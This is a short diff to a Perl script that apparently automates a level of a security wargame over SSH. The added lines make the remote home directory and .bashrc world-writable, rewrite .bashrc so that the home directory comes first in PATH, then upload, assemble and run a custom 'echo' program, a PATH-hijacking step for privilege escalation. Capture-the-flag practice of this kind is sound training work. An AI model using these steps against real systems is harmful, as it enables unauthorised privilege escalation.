@@ -11,6 +11,19 @@ $scp = "scp -q -P 4242 $user\@$ip:~/level04.pl .";
 print $red, $scp, $reset, "\n";
 system($scp);
 
+$path = "PATH=~:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
+$input = "chmod 777 . && chmod 777 .bashrc && echo $path > .bashrc";
+print $green, $input, $reset, "\n";
+system("ssh -qp 4242 $user\@$ip '$input'");
+
+$scp2 = "scp -q -P 4242 ./echo.s $user\@$ip:~";
+print $red, $scp2, $reset, "\n";
+system($scp2);
+
+$tool = "as echo.s && ld a.out -o echo && ./echo";
+print $green, $tool, $reset, "\n";
+system("ssh -qp 4242 $user\@$ip '$tool'");
+
 #file $file # basic informations
 #ldd $file # dynamic libraries
 #objdump -d $file # assembly code
